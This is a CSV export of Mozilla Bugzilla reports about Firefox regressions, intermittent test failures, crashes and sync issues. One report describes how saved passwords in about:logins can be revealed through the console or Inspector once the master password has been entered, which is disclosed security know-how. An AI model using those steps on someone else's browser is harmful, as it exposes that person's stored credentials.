1608469,"Icon is a line above Title of Website, also the close ""X"" isnt in the outer right corner",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I simply updated Firefox Actual results: 1.) The closing ""x"" is right behind the Sites Title. 2.) In case a Pages Title is longer than my Tab the Icon will be on the first Line while the Title is, cutted in half, on a second Line. The ""x"" isnt visible. This also happens in ""Safe Mode"" Expected results: 1.) The ""x"" should be in the outer right corner of the Tab. 2.) Page Title should be shortened, placing ""x"" in the outer right corner."
1608473,Some pinned tabs disappear after update,RESOLVED,--,DUPLICATE,"I regularly pin 5 tabs. On the last two updates on Nightly (at least, yesterday, and today going to 74.0a1 (2020-01-10)), starting up after updating loses some of those tabs. I *think* I saw this start in late 73 (but I'm not sure), wherein the pinned tabs loaded in reverse order. However, both yesterday and today, only two of the pinned tabs loaded. The lost tabs aren't loaded un-pinned, they're just gone. Today it was pinned tabs 1 and 2 that came back. I think it was the same yesterday. I re-added the lost ones yesterday, and after updating this morning, they were gone again. (Oddly, this restart also has a phantom ""other"" Nightly launched (like when I'm running Browser Toolbox), which I can't kill nicely.) Happy to add more data as this is regularly reproducible on Nightly."
1608475,"Bookmark Menu OK, Bookmark Sidebar empty",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I simply updated Firefox Actual results: The Bookmarks Sidebar is empty. (Bookmarks in Menu and Toolbar are shown like they should!) The Bookmark Sidebar is showing a scrollbar on the wrong side. (This scrollbar isnt movable.) This also happens in Safe Mode. Expected results: Well, we all know how a Bookmark Sidebar should behave."
1608490,Intermittent browser/components/sessionstore/test/browser_unrestored_crashedTabs.js | Test timed out -,RESOLVED,P5,INCOMPLETE,"**Filed by:** ncsoregi [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284412252&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/CndH5r15TfSHtpkaICDr2w/runs/0/artifacts/public/logs/live_backing.log --- >[task 2020-01-10T15:45:49.096Z] 15:45:49 INFO - [task 2020-01-10T15:45:49.096Z] 15:45:49 INFO - Console message: [JavaScript Error: ""[Exception... ""Component returned failure code: 0x80520003 (NS_ERROR_FILE_EXECUTION_FAILED) [nsIProcess.runAsync]"" nsresult: ""0x80520003 (NS_ERROR_FILE_EXECUTION_FAILED)"" location: ""JS frame :: resource://gre/modules/CrashService.jsm :: runMinidumpAnalyzer/< :: line 50"" data: no]""] [task 2020-01-10T15:45:49.096Z] 15:45:49 INFO - runMinidumpAnalyzer/<@resource://gre/modules/CrashService.jsm:50:15 [task 2020-01-10T15:45:49.096Z] 15:45:49 INFO - runMinidumpAnalyzer@resource://gre/modules/CrashService.jsm:30:10 [task 2020-01-10T15:45:49.096Z] 15:45:49 INFO - addCrash@resource://gre/modules/CrashService.jsm:201:13 [task 2020-01-10T15:45:49.097Z] 15:45:49 INFO - [task 2020-01-10T15:45:49.097Z] 15:45:49 INFO - Buffered messages finished [task 2020-01-10T15:45:49.097Z] 15:45:49 INF"
1608497,Intermittent browser/base/content/test/webrtc/browser_devices_get_user_media_in_frame.js | Uncaught exception - at resource://specialpowers/SpecialPowersParent.jsm:1045 - TypeError: browsingContext.currentWindowGlobal is null,RESOLVED,P5,FIXED,**Filed by:** ncsoregi [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284421311&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/OUdcrdCES3S809GMbo38eA/runs/0/artifacts/public/logs/live_backing.log **Reftest URL:** https://hg.mozilla.org/mozilla-central/raw-file/tip/layout/tools/reftest/reftest-analyzer.xhtml#logurl=https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/OUdcrdCES3S809GMbo38eA/runs/0/artifacts/public/logs/live_backing.log&only_show_unexpected=1 --- >[task 2020-01-10T16:21:54.274Z] 16:21:54 INFO - TEST-PASS | browser/base/content/test/webrtc/browser_devices_get_user_media_in_frame.js | audio global indicator attribute as expected - [task 2020-01-10T16:21:54.274Z] 16:21:54 INFO - TEST-PASS | browser/base/content/test/webrtc/browser_devices_get_user_media_in_frame.js | screen global indicator attribute as expected - [task 2020-01-10T16:21:54.274Z] 16:21:54 INFO - TEST-PASS | browser/base/content/test/webrtc/browser_devices_get_user_media_in_frame.js | only one global indicator window - [task 2020-01-10T16:21:54.274Z] 16:21:54 INFO - reloading the web page [task 2020-01-10T16:21:54.275
1608517,"User pref ""browser.messaging-system.whatsNewPanel.enabled"" ignored FF72",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: When the ""What's New"" toolbar icon and menu entry was recently introduced in FF70 I added ""user_pref(""browser.messaging-system.whatsNewPanel.enabled"", false);"" to my user.js. This was successfully incorporated into prefs.js and suppressed the unwanted pop-up notifcation. Now FF72 has been released, this pref is ignored/over-ridden. Actual results: With the release of FF72 the user pref is ignored/over-ridden and the unwanted toolbar icon and hamburger menu entry is back. Expected results: The user pref should be honoured and suppress the toolbar icon and hamburger menu entry."
1608524,Cannot give a new folder a different name in the create bookmark popup,RESOLVED,--,DUPLICATE,1. Click the star to bookmark a page. 2. in the popup click the arrow next to the folder to expand the folder list. 3. Click to create a new folder. Expected: A new folder is created and the name selected for editing and can be changed. Actual: A new folder is created and the name is selected for editing but loses focus after less than a second.
1608541,Clear cookies and site data dialog missing buttons,VERIFIED,--,FIXED,"Steps to reproduce: 1. Navigate to a site that sets cookies. 2. Open site identity panel and click ""Clear Cookies and Site Data..."" What happens: Dialog appears without visible buttons. Expected result: Buttons should be visible without resizing dialog. 15:06.55 INFO: No more inbound revisions, bisection finished. 15:06.55 INFO: Last good revision: 88b25807638231dcf403d8f0b597fc770f1d24a4 15:06.55 INFO: First bad revision: e183cbb4983cfb3aecf97ab18fad916b91f89e7e 15:06.55 INFO: Pushlog: https://hg.mozilla.org/integration/autoland/pushloghtml?fromchange=88b25807638231dcf403d8f0b597fc770f1d24a4&tochange=e183cbb4983cfb3aecf97ab18fad916b91f89e7e"
1608545,Opening a new tab in the same container doesn't work,RESOLVED,P2,FIXED,"In the last couple of days when I am in a non default container and I open a new tab using Cmd-Click on the new tab button (+) the tab gets the correct container indicator, but the page opens with the credentials in my default container. My typical use case is with GDocs, but I notice it with other sites, too."
1608554,Firefox: Unable to initially Access on-screen Controls with the Keyboard after Changing Search Bar Settings from within a New Profile,RESOLVED,P1,FIXED,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: To reproduce - this assumes that a fresh Firefox profile is being used and that NVDA 2019.2.1 is running: 1. Open Firefox, and navigate to Tools/Options - ensure that NVDA's Focus Mode is enabled at this point 2. Open the ""Search"" panel, and either tab or shift + tab out of the Options in this panel and to the other visible controls on the screen - including the address bar and other tab-able items. The idea here is to prove that NVDA is able to navigate to these at this stage 3. Navigate back to the available options from within the Search panel, and in the selection of radio buttons that controls how the search box is selected, change this selection to ""Add search bar in toolbar"" 4. Finally, as before, either tab or shift + tab out of the Search settings, and into the on-screen controls Actual results: After changing this setting to force the Search Bar to appear separately to the Address Bar, on-screen controls should still be tab-able - which isn't initially the case after changing the above setting. It's worth noting that if Firefox is then closed and the same profile "
1608564,Can not syncronize full of my personal sync-data (pw's) between two devices with FF sync,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Firefox for Android Steps to reproduce: I am a Firefox Sync user from beginning on. I logged in some months ago into my android, I validated the login and I gave a different pw as masterpassword for the pw-manager for android. I tried severell times to sync betweend the devices Actual results: I can't see all of my pw's from windows device on the phone. It seems that it stopped working syncing the pw from some time on. The tabs and bookmarks are mirrored. Expected results: Get the complete pw's from Windows Firefox onto the Android device , too."
1608565,Intermittent browser/components/enterprisepolicies/tests/browser/browser_policy_disable_privatebrowsing.js | application terminated with exit code 2,RESOLVED,P5,INCOMPLETE,**Filed by:** dvarga [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284450914&repo=autoland **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/FYoUlSiURTu3HTXscZpgHA/runs/0/artifacts/public/logs/live_backing.log --- ``` [task 2020-01-10T20:27:53.467Z] 20:27:53 INFO - TEST-START | browser/components/enterprisepolicies/tests/browser/browser_policy_disable_privatebrowsing.js [task 2020-01-10T20:27:54.155Z] 20:27:54 INFO - GECKO(2130) | [GFX1-]: Receive IPC close with reason=AbnormalShutdown [task 2020-01-10T20:27:54.155Z] 20:27:54 INFO - GECKO(2130) | Exiting due to channel error. [task 2020-01-10T20:27:54.155Z] 20:27:54 INFO - GECKO(2130) | Exiting due to channel error. [task 2020-01-10T20:27:54.155Z] 20:27:54 INFO - GECKO(2130) | Exiting due to channel error. [task 2020-01-10T20:27:54.156Z] 20:27:54 INFO - GECKO(2130) | Exiting due to channel error. [task 2020-01-10T20:27:54.156Z] 20:27:54 INFO - GECKO(2130) | Exiting due to channel error. [task 2020-01-10T20:27:54.156Z] 20:27:54 INFO - GECKO(2130) | Exiting due to channel error. [task 2020-01-10T20:27:54.156Z] 20:27:54 INFO - GECKO(2130) | Exiting due to channel error.
1608597,[Nudges] Top sites will conflict with the nudges/tips experiment on 74,RESOLVED,P1,FIXED,"Top sites and quantumbar update1 are scheduled to ship on release in 74, if I'm not mistaken. 74 is also the final release where the nudges/tips experiment will run: https://experimenter.services.mozilla.com/experiments/search-tips-aka-nudges/ That's a problem because both top sites and nudges use restricting providers, and right now we only support one restricting provider at a time. The result is that when the experiment opens the quantumbar view to show a tip on 74, the top sites are also shown (at best) or only the top sites are shown, with no tip at all (at worst). So we need to fix this for 74 somehow. We might fix it by fixing bug 1607797, and if so, this bug is just a dupe of that bug. I can also imagine a wallpaper/quick fix that isn't blocked on fixing that larger bug."
1608601,"[Nudges] Urlbar input isn't cleared after clicking the redirect tip's ""Okay, Got It"" button",RESOLVED,P1,FIXED,"This is a last-minute nudges/tips bug that Harry found today. It's a problem on 72 and later versions. I don't think it's a show stopper -- we could ship the extension with it -- but I also think we should fix it. We should able to do it entirely from the add-on without landing any production code in m-c, but it will require an experiment API addition. When the redirect tip is shown (for example on google.com), the input correctly is empty, but when you then click the tip's ""Okay, Got It"" button, the input's value is set to the page's URL. So you have to clear the input before you can search. It should remain empty when you click the button. Harry found this while porting the extension in bug 1606909. The value is set to the URL by the handleRevert call here: https://searchfox.org/mozilla-central/rev/d4d6f81e0ab479cde192453bae83d5e3edfb39d6/browser/components/urlbar/UrlbarInput.jsm#615 The stack is: _setValue (UrlbarInput.jsm#1076) value (UrlbarInput.jsm#941) URLBarSetURI (browser.js#3390) handleRevert (UrlbarInput.jsm#434) pickElement (UrlbarInput.jsm#615) _on_mouseup (UrlbarView.jsm#1424) handleEvent (UrlbarView.jsm#499)"
1608606,Multi-select tabs: closing tab with X button should only affect the target tab.,NEW,P2,,"As stated by Jared [here](https://bugzilla.mozilla.org/show_bug.cgi?id=1578131#c2), clicking on the X button of a multi-selected tab should only close that one tab to maintain parity with Chrome. Note: Triggering Ctrl-W should still remove the whole selection."
1608622,Crash in [@ nsUrlClassifierDBService::AsyncClassifyLocalWithFeatures],RESOLVED,--,DUPLICATE,This bug is for crash report bp-9984720f-ff23-442c-b227-41f590200111. ``` Top 10 frames of crashing thread: 0 xul.dll nsUrlClassifierDBService::AsyncClassifyLocalWithFeatures toolkit/components/url-classifier/nsUrlClassifierDBService.cpp:2534 1 xul.dll XPTC__InvokebyIndex 2 @0x20036039c7f 3 xul.dll trunc 4 xul.dll trunc 5 xul.dll trunc 6 xul.dll static XPCWrappedNative::CallMethod js/xpconnect/src/XPCWrappedNative.cpp:1150 7 xul.dll XPC_WN_CallMethod js/xpconnect/src/XPCWrappedNativeJSOps.cpp:948 8 xul.dll js::InternalCallOrConstruct js/src/vm/Interpreter.cpp:544 9 xul.dll Interpret js/src/vm/Interpreter.cpp:3038 ```
1608631,"Perma Beta TEST-UNEXPECTED-FAIL | browser_urlbar_event_telemetry.js | value in event urlbar#engagement#enter must match. - ""typed"" matches ""returned"" - JS frame :: TelemetryTestUtils.jsm :: assertEvents :: line 212 when Gecko merges to Beta on 2020-02-10",VERIFIED,P1,FIXED,"Central as Beta simulation: https://treeherder.mozilla.org/#/jobs?repo=try&resultStatus=success%2Ctestfailed%2Cbusted%2Cexception%2Crunnable&revision=291a9ff0d936e01cac4631a3846283cb97cb40ef&searchStr=%28bc&selectedJob=284523638 Failure log: https://treeherder.mozilla.org/logviewer.html#/jobs?job_id=284523638&repo=try&lineNumber=3358 [task 2020-01-11T11:00:48.457Z] 11:00:48 INFO - TEST-PASS | browser/components/urlbar/tests/browser/browser_urlbar_event_telemetry.js | method in event urlbar#engagement#enter must match. - ""engagement"" matches ""engagement"" - [task 2020-01-11T11:00:48.458Z] 11:00:48 INFO - TEST-PASS | browser/components/urlbar/tests/browser/browser_urlbar_event_telemetry.js | object in event urlbar#engagement#enter must match. - ""enter"" matches ""enter"" - [task 2020-01-11T11:00:48.459Z] 11:00:48 INFO - Buffered messages finished [task 2020-01-11T11:00:48.459Z] 11:00:48 INFO - TEST-UNEXPECTED-FAIL | browser/components/urlbar/tests/browser/browser_urlbar_event_telemetry.js | value in event urlbar#engagement#enter must match. - ""typed"" matches ""returned"" - JS frame :: resource://testing-common/TelemetryTestUtils.jsm :: assertEvents :: line 212 [task 2020-01-11T11:00:48.459"
1608637,File handler open with problems,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Click to download a file 2. Choose to open with appliction 3. Try to open file in that application Actual results: There is no list of my chosen apps to open specific file. I have to search for it everytime I choose ""open with"" option. In addition, the selected application indicates that the file does not exist when trying to open the file (a space in the file name breaks the line). This means that Firefox does not pass the variable with the file path in quotation marks. Expected results: A list of previously selected applications should appear. After launching the selected application, the file should open normally."
1608638,"Perma Beta TEST-UNEXPECTED-FAIL | browser/base/content/test/performance/browser_urlbar_keyed_search.js | unexpected changed rect: ({x1:252, x2:291, y1:57, y2:66, w:40, h:10}), window width: 1280 - when Gecko merges to Beta on 2020-02-10",VERIFIED,P1,FIXED,"Central as Beta simulation: https://treeherder.mozilla.org/#/jobs?repo=try&revision=291a9ff0d936e01cac4631a3846283cb97cb40ef&searchStr=windows%2C10%2Cx64%2Cdevedition%2Copt%2Cmochitests%2Ctest-windows10-64-devedition%2Fopt-mochitest-browser-chrome-e10s-2%2Cm%28bc2%29&selectedJob=284538744 Failure log: https://treeherder.mozilla.org/logviewer.html#/jobs?job_id=284538700&repo=try&lineNumber=2321 [task 2020-01-11T13:47:17.027Z] 13:47:17 INFO - TEST-PASS | browser/base/content/test/performance/browser_urlbar_keyed_search.js | 0 unexpected reflows - true == true - [task 2020-01-11T13:47:17.027Z] 13:47:17 INFO - comparing 7 frames [task 2020-01-11T13:47:17.027Z] 13:47:17 INFO - Buffered messages finished [task 2020-01-11T13:47:17.027Z] 13:47:17 INFO - TEST-UNEXPECTED-FAIL | browser/base/content/test/performance/browser_urlbar_keyed_search.js | unexpected changed rect: ({x1:252, x2:291, y1:57, y2:66, w:40, h:10}), window width: 1280 - [task 2020-01-11T13:47:17.027Z] 13:47:17 INFO - Stack trace: [task 2020-01-11T13:47:17.027Z] 13:47:17 INFO - chrome://mochikit/content/browser-test.js:test_ok:1292 [task 2020-01-11T13:47:17.027Z] 13:47:17 INFO - chrome://mochitests/content/browser/browser/ba"
1608656,pocket has only one row on new pageand no option to change,UNCONFIRMED,P3,,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: update from firefox 71.0 to 72.0.1 Actual results: pocket has only one row on new page and the option to change it disappered. the value browser.newtabpage.activity-stream.topSitesRows=4 is still present in about:config Expected results: pocket has four rows on new page
1608668,Nightly 2020-01-11 breaks tree style tabs,RESOLVED,--,WORKSFORME,"Tree style tabs no longer shows up when clicked from the toolbar. Exception on browser console: [Exception... ""Component returned failure code: 0x80004005 (NS_ERROR_FAILURE) [nsIControllers.removeController]"" nsresult: ""0x80004005 (NS_ERROR_FAILURE)"" location: ""JS frame :: chrome://global/content/elements/browser-custom-element.js :: destroy :: line 1374"" data: no] browser-custom-element.js:1374:28 destroy chrome://global/content/elements/browser-custom-element.js:1374 disconnectedCallback chrome://global/content/elements/browser-custom-element.js:408 destroy resource:///modules/ExtensionPopups.jsm:142 (Async: promise callback) destroy resource:///modules/ExtensionPopups.jsm:139 destroy resource:///modules/ExtensionPopups.jsm:677 clearPopup chrome://browser/content/parent/ext-browserAction.js:498 handleEvent chrome://browser/content/parent/ext-browserAction.js:397 onmouseout chrome://browser/content/parent/ext-browserAction.js:201 (Async: EventHandlerNonNull) onCreated chrome://browser/content/parent/ext-browserAction.js:201 aEventName resource:///modules/CustomizableUI.jsm:2864 buildWidget resource:///modules/CustomizableUI.jsm:1786 getWidgetNode resource:///modules/CustomizableUI"
1608672,Nightly does not restore all pinned tabs lately,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: * Allow Nightly to update itself. * Observe that not all pinned tabs are restore. Actual results: I keep three pinned tabs: Gmail, Twitter, Feedly. I noticed a few days ago -- maybe 1/8/2020 -- that after Nightly updated itself and restarted, only one pinned tab was open and pinned: Twitter. The other two appear to have been closed or not restored. I opened and pinned new tabs for each, then noticed today that Gmail and Feedly pinned tabs had not been restored. Expected results: Restore all tabs, don't forget pinned tabs. Sidenote: I still have the Conex extension loaded. It was an attempt to manage tab groups. Firefox has dropped that ball which is another matter for another time."
1608687,"Master password prompt gives the appearance of a security check, but can be bypassed once it was already unlocked",NEW,P5,,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Start Firefox (with a set up Master Password) 2. User enters the master password because he is forced by Firefox to enter it once initially at start 3. User uses his browser as usual 4. Attacker opens 'about:logins' and can reveal all saved passwords Actual results: The prompt for masterpassword makes the appearance that the passwords within 'about:logins' are somekind of protected. But you can without entering the masterpassword and by not clicking on the ""View Password""-Buttons do the following things: - You can search for passwords with the search field. - You can access the javascript object from Developer Console. - You can change type=password to type=text with Inspector to reveal plain-text passwords. Expected results: The prompt for master password when clicking on ""Show password"" gives the appearance of a security check that is obviously easy to bypass. I would have expected a different level of protection or at least not one that gives the appearance of being one."
1608691,Impossible to provide a name for newly created bookmark folders,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Bookmark a site with ctrl+d 2. In the opened bookmark details box click on Folder/Choose 3. Click on the ""New Folder"" button Actual results: You get a ""New Folder"" and you cannot type in the name for it. The result is a ""New Folder"" that can be renamed only in the bookmark manager. Expected results: You should get a New Folder with the label waiting for user input for the name of the folder."
1608696,Layout for Icons of One-Click Search Engines Sometimes become messed up,NEW,P3,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I browsed internet like a normal person. Actual results: It just become like this after some time of use. You can fix it by changing the engines in setting and everything goes back to normal, but after a while it become messed up again. I do not know what trigger it. Expected results: It should not be messed up."
1608697,Session restore during startup loses pages' URLs if proxy server responds with HTTP/403,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Firefox 72.0.1, Windows 7 x64, addons disabled, configured to restore previous session. Internet connection through HTTP proxy server (Squid) Session restore during Firefox startup, but HTTP proxy server responds with HTTP/403 code (temporary Access Denied, e.g. due to some misconfiguration), Actual results: Firefox loses URL addresses of pages/tabs (address bar is blank, page contains usual ""connection failed"" information) Reload button is inactive, i.e. cannot just reload after internet connection problem is resolved. This only happens for pages that are not in cache, tested with https://refreshyourcache.com/en/cache-test/ (If page is cached, then its restore does not depend on broken internet connectivity and works as expected) If Firefox is restarted after proxy issue is resolved, saved URLs (which were blank) are often restored, but there are some edge cases when URLs are lost permanently (happened during Firefox upgrade, cannot reproduce this with just restarting). Also affects addons like Tab Session Manager (it saves such tabs as blank) Expected results: Address bar"
1608710,No respect of menu option (in french : Paramètres / Paramètres de l'appareil),RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Menus are in French: Compte / Paramètres / Paramètres de l'appareil Modifications in synchro options for sync are not for this computer, but for all computers... Actual results: I use Syc with 3 PC. On 2 PC Iwant synchronize bookmarks, password and preferences. For 1 PC, I don't want synchronize Bookmarks, so I uncheck this option in the configuration menu for this computer. Expected results: This options (bookmarks unchecked) is propagated to all PC. So all bookmarks can't be synchro beetween my 2 PC. It's not an option for a computer, but for all PC. Options of sync must be different beetween all machines and synchro only for parameters what are checked locally. Thanks"
1608713,Captive portal login tab should setTRRMode(Ci.nsIRequest.TRR_DISABLED_MODE),VERIFIED,--,FIXED,"In Bug 1552176 we added a mechanism to nsIRequest to have a different TRR mode for each individual HTTP request. This should prove useful for people running TRR in mode3, but who connect to a WiFi network that requires login and is hosted on a domain such as `captive.domain.com` instead of a network ip `10.0.5.2`. While for an IP we don't need to resolve a domain name, if the captive portal server is hosted on a certain domain (even if it's located in the local network but requires DNS), what would happen is that the captive portal detector sees a captive portal, we open a new tab to the captive portal endpoint, but since the new tab uses a regular channel with TRR mode 3 it will fail to resolve. So we need that the tab that is specifically opened for the captive portal login to be in TRR mode 0. I initially designed the API so that we could `setTRRMode` on all necessary channels but it seems to me that it's easier just to set the `nsIDocShell.defaultLoadFlags |= 1 << 3` (maybe I should add a named constant for this in the IDL) and it should be applied to all requests within the docshell. Nihanth, what do you think?"
1608726,Top Sites - wrong position,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Just like that my Top Sites are not centered but located at the top of firefox screen. It happens cca week ago, no settings changed, it happened ""just like that""... Actual results: Just like that my Top Sites are not centered but located at the top of firefox screen. It happens cca week ago, no settings changed, it happened ""just like that""... Expected results: Aligned to the center of the window."
1608736,Intermittent browser/extensions/doh-rollout/test/browser/browser_doorhangerUserReject.js | Uncaught exception - undefined - timed out after 50 tries.,RESOLVED,P5,INCOMPLETE,**Filed by:** btara [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=284596181&repo=mozilla-beta **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/FvlUKemeQhSnvFHcYfzDIw/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-12T23:47:44.143Z] 23:47:44 INFO - TEST-START | browser/extensions/doh-rollout/test/browser/browser_doorhangerUserReject.js [task 2020-01-12T23:47:49.259Z] 23:47:49 INFO - TEST-INFO | started process screentopng [task 2020-01-12T23:47:49.677Z] 23:47:49 INFO - TEST-INFO | screentopng: exit 0 [task 2020-01-12T23:47:49.678Z] 23:47:49 INFO - Buffered messages logged at 23:47:44 [task 2020-01-12T23:47:49.678Z] 23:47:49 INFO - Entering test bound testDoorhangerUserReject [task 2020-01-12T23:47:49.678Z] 23:47:49 INFO - Buffered messages finished [task 2020-01-12T23:47:49.678Z] 23:47:49 INFO - TEST-UNEXPECTED-FAIL | browser/extensions/doh-rollout/test/browser/browser_doorhangerUserReject.js | Uncaught exception - undefined - timed out after 50 tries. [task 2020-01-12T23:47:49.678Z] 23:47:49 INFO - Leaving test bound testDoorhangerUserReject [task 2020-01-12T23:47:49.679Z] 23:47:49 INFO - GECKO(7384)
1608739,Google.com keep appear in suggestion,RESOLVED,P5,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Type g in the location url Actual results: Show google.com in first place Expected results: Show bookmark starting with g, but not google.com ! Since i've removed google.com from search engine, since i completely disabled browsing history, why google.com keep being appear in first place when i type the g letter ? He not come from browsing history (private mode by default) or bookmark, so, where does he come from ?"
1608766,openViewOnFocus breaks most common pattern for quickly navigating toolbars with the keyboard,VERIFIED,P2,FIXED,"Bug 1603778 enabled browser.urlbar.openViewOnFocus by default in Nightly. Unfortunately, this breaks the most common (and [officially documented on Mozilla support](https://support.mozilla.org/en-US/kb/access-toolbar-functions-using-keyboard)) pattern for quickly navigating toolbars with the keyboard: 1. Users press alt+d or control+l. 2. They would then generally press tab or shift+tab to begin navigating to other toolbar controls. With openViewOnFocus enabled, pressing tab or shift+tab (step 2) moves through address bar suggestions instead of moving to the next or previous toolbar control. The tricky issue here is that this behaviour appears to be by design. I don't know what the product goal is, but we clearly want users to see the suggestion list when they focus the address bar. If that's what we want for mouse users, it follows that it's also what we want for keyboard users... but currently, that's in direct conflict with toolbar keyboard navigation. There are three possible solutions: 1. Don't do openViewOnFocus for keyboard users. But that means keyboard users get a different UX. 2. Stop tab/shift+tab from navigating suggestions, either always or only if openViewOnFocus trig"
1608802,Text in permission management list in about:preferences is spread across 2 lines instead of 1,VERIFIED,P1,FIXED,"STR: 1. Open about:preferences#privacy 2. Scroll to the Permissions section, see the permission name is in a new line after its icon 3. Same goes to the ""Allow Nightly to send technical and interaction data to Mozilla"" checkbox in the Data Collection section Regressed by bug 1606130."
1608803,The user is wrongly unenrolled from the study due to unexpected “CAUGHT ERROR” exception after browser restart,VERIFIED,P1,FIXED,"**[Affected versions]:** - Firefox Unbranded 72.0.2 - Build ID: 20200109172031 - Firefox Nightly 73.0a1 - Build ID: 20191231213920 - Firefox Nightly 74.0a1 - Build ID: 20200112214546 **[Affected Platforms]:** - Windows 10 x64 - Mac 10.15.2 - Ubuntu 18.04 x64 **[Prerequisites]:** - Have a new Firefox profile. - Have the following prefs in the “about:config” page: - user_pref(""security.content.signature.root_hash"", ""DB:74:CE:58:E4:F9:D0:9E:E0:42:36:BE:6C:C5:C4:F6:6A:E7:74 :7D:C0:21:42:7A:03:BC:2F:57:0C:8B:9B:90""); - user_pref(""app.normandy.api_url"", ""https://stage.normandy.nonprod.cloudops.mozgcp.net/api/v1""); - user_pref(""app.normandy.dev_mode"", true); - user_pref(""app.normandy.logging.level"", 0); - user_pref(""services.settings.server"", ""https://settings.stage.mozaws.net/v1""); - user_pref(""ppop-MSP"", true); - user_pref(""xpinstall.signatures.dev-root"", true); **[Steps to reproduce]:** 1. Open the browser with the profile from prerequisites. 2. Open the “Browser Console” (Ctrl+Shift+J). 3. Click the “Console Settings” button from the upper right corner of the web console and select “Show Content Messages” option. 4. Restart browser and observe the “Browser Console”. **[Expected result"
1608811,Firefox Opens 'Open File With...'-Dialog when opening a download from the download list and shows no applications,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: I downloaded a file (i.e. an Excel sheet, PowerPoint file, PDF) and tried to open it from download manager Actual results: It opened the Firefox's ""Open With..."" Dialogue window Expected results: Opens file with given application (or in case of pdf it should open with the PDF viewer of Firefox)"
1608829,"""Learn more"" link in the Data Collection section on about:preferences is in a second line instead of the same line",VERIFIED,P1,FIXED,"+++ This bug was initially created as a clone of Bug #1608802 +++ STR: 1. Open about:preferences#privacy 2. Scroll to the Data Collection section, see the ""Allow Nightly to send technical and interaction data to Mozilla"" checkbox AR: ""Learn More"" link in a new line ER: Should be in the same line. Regressed by bug 1606130."
1608832,Normandy Stage recipes are no longer executed on Beta and Dev Edition 73,VERIFIED,--,FIXED,"[Affected Platforms]: - All Windows - All Mac - All Linux [Affected Versions]: - Firefox Beta 73.0b4, Build ID 20200112220634 - Firefox Dev Edition 73.0b4, Build ID 20200112220634 [Prerequisites]: - Have the ""security.content.signature.root_hash"" pref set to ""DB:74:CE:58:E4:F9:D0:9E:E0:42:36:BE:6C:C5:C4:F6:6A:E7:74:7D:C0:21:42:7A:03:BC:2F:57:0C:8B:9B:90"". - Have the ""app.normandy.api_url"" pref set to ""https://stage.normandy.nonprod.cloudops.mozgcp.net/api/v1"". - Have the ""app.normandy.dev_mode"" pref set to ""true"". - Have the ""app.normandy.logging.level"" pref set to ""0"". - Have the ""services.settings.server"" pref set to ""https://settings.stage.mozaws.net/v1"". - Have the ""ppop-nor2"" pref set to ""true"". [Steps to reproduce]: 1. Open the browser with the profile from prerequisites and open the Browser Console. 2. Observe the console output. [Expected result]: - The client is enrolled in a recipe. [Actual result]: - The client is not enrolled and the ""No recipes to execute"" string is displayed. [Notes]: - Several Remote Settings errors and warnings are displayed in the Browser Console. - Using the Remote Settings Devtools add-on several timestamps are not synced with the stage server. -"
